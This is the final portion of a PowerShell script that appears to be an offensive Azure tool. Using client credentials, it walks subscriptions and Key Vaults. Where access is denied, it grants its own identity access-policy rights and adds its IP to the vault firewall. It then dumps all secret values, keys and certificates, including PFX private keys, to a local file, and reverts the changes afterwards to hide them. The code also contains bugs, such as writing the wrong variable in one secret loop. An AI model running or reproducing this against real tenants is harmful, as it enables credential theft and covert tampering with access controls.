                                                        SecretValue      = $resp.value
                                                    }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                                }
                                                $uri = $page.nextLink
                                            }

                                        Write-Host "[!] Extracting Keys.."
                                        $uri = "https://$vaultName.vault.azure.net/keys?api-version=7.4"
                                        while ($null -ne $uri) {
                                            try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                            catch { Write-Host "[-] Failed to list keys" -ForegroundColor Red; break }

                                                foreach ($id in $page.value.id) {
                                                    $getUri = "$($id)?api-version=7.4"
                                                    
                                                    $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                    try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                    catch { continue }
                                                    
                                                    $res = [pscustomobject]@{
                                                        SubscriptionName = $sub.SubscriptionId
                                                        ResourceGroup    = $ResourceGroup
                                                        ResourceName     = $vaultName
                                                        ResourceType     = "KeyVault-Key"
                                                        KeyName          = $name
                                                        KeyId            = $resp.key.kid
                                                        KeyOps           = ($resp.key.key_ops -join ',')
                                                    }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                                }
                                                $uri = $page.nextLink
                                            }
                                        
                                        Write-Host "[!] Extracting Certificates.."
                                        $uri = "https://$vaultName.vault.azure.net/certificates?api-version=7.4"
                                        while ($null -ne $uri) {
                                            try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                            catch { Write-Host "[-] Failed to list certificates" -ForegroundColor Red; break }

                                                foreach ($id in $page.value.id) {
                                                   $getUri = "$($id)?api-version=7.4"
                                                   
                                                    $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                    try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                    catch { continue }
                                                    
                                                    $res =  [pscustomobject]@{
                                                        SubscriptionName = $sub.SubscriptionId
                                                        ResourceGroup    = $ResourceGroup
                                                        ResourceName     = $vaultName
                                                        ResourceType     = "KeyVault-Certificate"
                                                        CertificateName  = $name
                                                        CerBase64Der     = $resp.cer
                                                    }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                                    try {
                                                        $sec = Invoke-RestMethod -Method GET -Uri ("https://$vaultName.vault.azure.net/secrets/$name?api-version=7.4") -Headers $HeadersVault -ErrorAction Stop
                                                        
                                                        if ($sec.contentType -eq 'application/x-pkcs12') {
                                                            $res = [pscustomobject]@{
                                                                SubscriptionName = $sub.SubscriptionId
                                                                ResourceGroup    = $ResourceGroup
                                                                ResourceName     = $vaultName
                                                                ResourceType     = "KeyVault-Certificate-PFX"
                                                                CertificateName  = $name
                                                                PfxBase64        = $sec.value
                                                            }
                                                        $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                        $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                        [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                        $linesWritten++
                                                        }
                                                    } catch { }
                                                }
                                                $uri = $page.nextLink
                                        }
                                        try{
                                            $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                        }
                                        catch{

                                        }
                                        try{
                                            $null = remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -ErrorAction Stop
                                        }
                                        catch{

                                        }
                                        
                                    }
                                    else{
                                        write-host "[!]Identity Can Not Read Data, Trying bypass" -ForegroundColor gray
                                        $APCheck = Test-CanModifyAccessPolicy -SubscriptionId  $($sub.SubscriptionId) -HeadersARM $HeadersARM

                                        if($APCheck -eq 'Good'){
                                            $y = $false
                                            $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                            $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                            Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null

                                            write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen

                                            try{
                                               $null = Set-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List -ErrorAction Stop
                                            }
                                            catch{
                                                write-host "[-] Could No make change on Access Policy Rule"
                                            }
                                                if($y){
                                                    write-host "[+]Added full permissions on Key Vault to your Itentity"
                                                    $y = $False
                                                }
                                            try{
                                                $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                                $y = $True
                                            }
                                            catch{
                                                write-host "[-] Could Not added yout ip to Network Rule .."
                                            }                                        
                                                if($y){
                                                    write-host "[+]your IP Address: $MyIp added successfully to Network Rule"
                                                    $y = $False
                                                }

                                            if ($ClientID -and $ClientSecret -and $TenantID){
                                                $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                            }
                                            elseif ($RefreshToken -and $TenantID) {
                                                $VaultToken1 =  GetVaultToken -RefreshToken $RefreshToken -TenantID $TenantID
                                            }
                                            else{
                                                throw "Missing auth for Vault token"
                                            }
                                            $HeadersVault = @{
                                                'Authorization' = "Bearer $VaultToken1"
                                                'Accept' = "application/json"
                                                'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                            }
            
                                            Write-Host "[!] Extracting Secrets.."
                                            $uri = "https://$vaultName.vault.azure.net/secrets?api-version=7.4"
                                            while ($null -ne $uri) {
                                                try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { Write-Host "[-] Failed to list secrets" -ForegroundColor Red; break }

                                                foreach ($id in $page.value.id) {
                                                    $getUri = "$($id)?api-version=7.4"
                                                    
                                                    $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                    try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                    catch { continue }
                                                    
                                                        $sec = [pscustomobject]@{
                                                            SubscriptionName = $sub.SubscriptionId
                                                            ResourceGroup    = $ResourceGroup
                                                            ResourceName     = $vaultName
                                                            ResourceType     = "KeyVault-Secret"
                                                            SecretName       = $name
                                                            SecretValue      = $resp.value
                                                        }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                                    }
                                                    $uri = $page.nextLink
                                                }

                                            Write-Host "[!] Extracting Keys.."
                                            $uri = "https://$vaultName.vault.azure.net/keys?api-version=7.4"
                                            while ($null -ne $uri) {
                                                try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { Write-Host "[-] Failed to list keys" -ForegroundColor Red; break }

                                                    foreach ($id in $page.value.id) {
                                                       $getUri = "$($id)?api-version=7.4"
                                                       
                                                        $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                        try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                        catch { continue }
                                                        
                                                        $res =  [pscustomobject]@{
                                                            SubscriptionName = $sub.SubscriptionId
                                                            ResourceGroup    = $ResourceGroup
                                                            ResourceName     = $vaultName
                                                            ResourceType     = "KeyVault-Key"
                                                            KeyName          = $name
                                                            KeyId            = $resp.key.kid
                                                            KeyOps           = ($resp.key.key_ops -join ',')
                                                        }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                                    }
                                                    $uri = $page.nextLink
                                                }
                                                
                                            Write-Host "[!] Extracting Certificates.."
                                            $uri = "https://$vaultName.vault.azure.net/certificates?api-version=7.4"
                                            while ($null -ne $uri) {
                                                try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { Write-Host "[-] Failed to list certificates" -ForegroundColor Red; break }

                                                    foreach ($id in $page.value.id) {
                                                       $getUri = "$($id)?api-version=7.4"
                                                       
                                                        $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                        try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                        catch { continue }
                                                        
                                                        $res = [pscustomobject]@{
                                                            SubscriptionName = $sub.SubscriptionId
                                                            ResourceGroup    = $ResourceGroup
                                                            ResourceName     = $vaultName
                                                            ResourceType     = "KeyVault-Certificate"
                                                            CertificateName  = $name
                                                            CerBase64Der     = $resp.cer

                                                        }
                                                        $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                        [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                        $linesWritten++
                                                        try {
                                                            $sec = Invoke-RestMethod -Method GET -Uri ("https://$vaultName.vault.azure.net/secrets/$name?api-version=7.4") -Headers $HeadersVault -ErrorAction Stop
                                                            
                                                            if ($sec.contentType -eq 'application/x-pkcs12') {
                                                                $res = [pscustomobject]@{
                                                                    SubscriptionName = $sub.SubscriptionId
                                                                    ResourceGroup    = $ResourceGroup
                                                                    ResourceName     = $vaultName
                                                                    ResourceType     = "KeyVault-Certificate-PFX"
                                                                    CertificateName  = $name
                                                                    PfxBase64        = $sec.value
                                                                }
                                                            $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                            $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                            [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                            $linesWritten++
                                                            }
                                                        } catch { }
                                                    }
                                                    $uri = $page.nextLink
                                                }
                                            $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                            $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                            Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null

                                            write-host "[!]Restoring changes..."
                                            try{
                                               $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP |-ErrorAction Stop
                                            }
                                            catch{  }
                                            try{
                                               $null = remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -ErrorAction Stop
                                                continue
                                            }
                                            catch{
                                                continue
                                            }
                                            write-host "[+]Settings restored successfully"
                                        }
                                        elseif($APCheck -eq 'Bad'){
                                            Write-Host "you have no permissions on this subscirptions or resource"
                                            continue

                                        }
                                    }
                                }
                                else{
                                    write-Host "[!]Identity's Object ID not found in Network Rule, Trying to Bypass.." -ForegroundColor gray

                                    $APCheck = Test-CanModifyAccessPolicy -SubscriptionId  $($sub.SubscriptionId) -HeadersARM $HeadersARM

                                    if($APCheck -eq 'Good'){
                                        $y = $false
                                        $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        Connect-AzAccount -AccessToken $($AzureARMToken) -MicrosoftGraphAccessToken $($GraphToken) -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null

                                        write-host "[+]Bypassed, Can Modify Setting..." -ForegroundColor DarkGreen
                                    
                                        try{
                                            $null = Set-AzKeyVaultAccessPolicy -VaultName $($vaultName) -ResourceGroupName $($ResourceGroup) -ObjectId $($MyOid) -PermissionsToSecrets Get, List -PermissionsToKeys Get, List -PermissionsToCertificates Get, List -ErrorAction Stop
                                            $y = $True
                                        }
                                        catch{
                                            write-host "[-] Could No make change on Access Policy Rule"
                                        }
                                            if($y){
                                                write-host "[+]Added full permissions on Key Vault to your Itentity"
                                                $y = $False
                                            }
                                        try{
                                           $null = Add-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                            $y = $True
                                        }
                                        catch{
                                            write-host "[-] Could Not added yout ip to Network Rule .."
                                        }    
                                            if($y){
                                                write-host "[+]your IP Address: $MyIp added successfully to Network Rule"
                                                $y = $False
                                            }                                    

                                        if ($ClientID -and $ClientSecret -and $TenantID){
                                            $VaultToken1 = GetVaultToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        }
                                        elseif ($RefreshToken -and $TenantID) {
                                            $VaultToken1 =  GetVaultToken -RefreshToken $RefreshToken -TenantID $TenantID
                                        }
                                        else{
                                            throw "[-]Missing auth for Vault token"
                                        }
                                        $HeadersVault = @{
                                            'Authorization' = "Bearer $VaultToken1"
                                            'Accept' = "application/json"
                                            'User-Agent'    = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
                                        }

                                        Write-Host "[!] Extracting Secrets.."
                                        $uri = "https://$vaultName.vault.azure.net/secrets?api-version=7.4"
                                        while ($null -ne $uri) {
                                            try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                            catch { Write-Host "[-] Failed to list secrets" -ForegroundColor Red; break }

                                            foreach ($id in $page.value.id) {
                                                $getUri = "$($id)?api-version=7.4"
                                                
                                                $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { continue }
                                                
                                                $res = [pscustomobject]@{
                                                    SubscriptionName = $sub.SubscriptionId
                                                    ResourceGroup    = $ResourceGroup
                                                    ResourceName     = $vaultName
                                                    ResourceType     = "KeyVault-Secret"
                                                    SecretName       = $name
                                                    SecretValue      = $resp.value
                                                }
                                                    $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                    $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                    [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                    $linesWritten++
                                            }
                                            $uri = $page.nextLink
                                        }

                                            Write-Host "[!] Extracting Keys.."
                                            $uri = "https://$vaultName.vault.azure.net/keys?api-version=7.4"
                                            while ($null -ne $uri) {
                                                try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { Write-Host "[-] Failed to list keys" -ForegroundColor Red; break }

                                                    foreach ($id in $page.value.id) {
                                                        $getUri = "$($id)?api-version=7.4"
                                                        
                                                        $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                        try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                        catch { continue }
                                                        
                                                        $res = [pscustomobject]@{
                                                            SubscriptionName = $sub.SubscriptionId
                                                            ResourceGroup    = $ResourceGroup
                                                            ResourceName     = $vaultName
                                                            ResourceType     = "KeyVault-Key"
                                                            KeyName          = $name
                                                            KeyId            = $resp.key.kid
                                                            KeyOps           = ($resp.key.key_ops -join ',')
                                                        } 
                                                        $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                        $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                        [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                        $linesWritten++
                                                    }
                                                    $uri = $page.nextLink
                                            }
                                                
                                            Write-Host "[!] Extracting Certificates.."
                                            $uri = "https://$vaultName.vault.azure.net/certificates?api-version=7.4"
                                            while ($null -ne $uri) {
                                                try { $page = Invoke-RestMethod -Method GET -Uri $uri -Headers $HeadersVault -ErrorAction Stop }
                                                catch { Write-Host "[-] Failed to list certificates" -ForegroundColor Red; break }

                                                    foreach ($id in $page.value.id) {
                                                        $getUri = "$($id)?api-version=7.4"
                                                        
                                                        $name   = (($getUri -split '\?')[0] -split '/')[-1]
                                                        try { $resp = Invoke-RestMethod -Method GET -Uri $getUri -Headers $HeadersVault -ErrorAction Stop }
                                                        catch { continue }
                                                        
                                                        $res = [pscustomobject]@{
                                                            SubscriptionName = $sub.SubscriptionId
                                                            ResourceGroup    = $ResourceGroup
                                                            ResourceName     = $vaultName
                                                            ResourceType     = "KeyVault-Certificate"
                                                            CertificateName  = $name
                                                            CerBase64Der     = $resp.cer
                                                        }
                                                        $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                        [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                        $linesWritten++
                                                        try {
                                                            $sec = Invoke-RestMethod -Method GET -Uri ("https://$vaultName.vault.azure.net/secrets/$name?api-version=7.4") -Headers $HeadersVault -ErrorAction Stop
                                                            
                                                            if ($sec.contentType -eq 'application/x-pkcs12') {
                                                                $res = [pscustomobject]@{
                                                                    SubscriptionName = $sub.SubscriptionId
                                                                    ResourceGroup    = $ResourceGroup
                                                                    ResourceName     = $vaultName
                                                                    ResourceType     = "KeyVault-Certificate-PFX"
                                                                    CertificateName  = $name
                                                                    PfxBase64        = $sec.value
                                                                }
                                                                $Utf8NoBom = New-Object System.Text.UTF8Encoding($false) 
                                                                $jsonLine = $res | ConvertTo-Json -Depth 12 -Compress
                                                                [System.IO.File]::AppendAllText($dataPath, $jsonLine + [Environment]::NewLine, $Utf8NoBom)
                                                                $linesWritten++
                                                            }
                                                        } catch { }
                                                    }
                                                    $uri = $page.nextLink
                                            }
                                        $GraphToken = GetGraphToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        $AzureARMToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
                                        Connect-AzAccount -AccessToken $AzureARMToken -MicrosoftGraphAccessToken $GraphToken -AccountId 1 -SubscriptionId $($sub.SubscriptionId) | out-null

                                        write-host "[!]Restoring changes..."
                                        try{
                                            $null = remove-AzKeyVaultNetworkRule -VaultName $vaultName -ResourceGroupName $ResourceGroup -IpAddressRange $myIP -ErrorAction Stop
                                        }
                                        catch{  }
                                        try{
                                            $null = remove-AzKeyVaultAccessPolicy -VaultName $vaultName -ResourceGroupName $ResourceGroup -ObjectId $MyOid -ErrorAction Stop
                                            continue
                                        }
                                        catch{
                                            continue
                                        }
                                        write-host "[+]Settings restored successfully"
                                    }
                                    else{
                                    Write-Host "[-]Your identity has no permissions to this resource"
                                    continue
                                    }
                                }

                            }
                            write-host "Key Vault without access policy... skip.."
                        }
        
                    }
                    
                
                $sUrl = $listResp.nextLink
            }while($sUrl)
        }

}

function GetTenantID{param([string]$TenantName)
        try {
            $resp = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$TenantName/.well-known/openid-configuration" -ErrorAction Stop
                $TenantID = ($resp.issuer -split '/')[3]
            } catch {
                Write-Host "[!] The specified domain is invalid or not reachable." -ForegroundColor Red
            }
        return $TenantID

}

function main{

    $creds = Show-ClientLoginGui -Topmost
    if ($creds) {
        $ClientID     = $creds.ClientId
        $ClientSecret = $creds.ClientSecret
        $DomainName   = $creds.Domain
    
    }

    $TenantID = GetTenantID -TenantName $DomainName

    $ArmToken = GetAzureARMToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID
    $Subscriptions = GetSubscriptions -AzureARMToken $ArmToken

        $dataPath = Join-Path $PWD 'kv_results.ndjson'
        if (Test-Path $dataPath) {
             Remove-Item $dataPath -Force 
             New-Item -ItemType File -Path $DataPath -Force | Out-Null
        }
        else{
            New-Item -ItemType File -Path $DataPath -Force | Out-Null
        }

    Get-SubscriptionKeyVaultsAccess -AzureARMToken $ArmToken -ClientID $ClientID -ClientSecret $ClientSecret -TenantID $TenantID -Subscriptions $Subscriptions -dataPath $dataPath

}

main
}
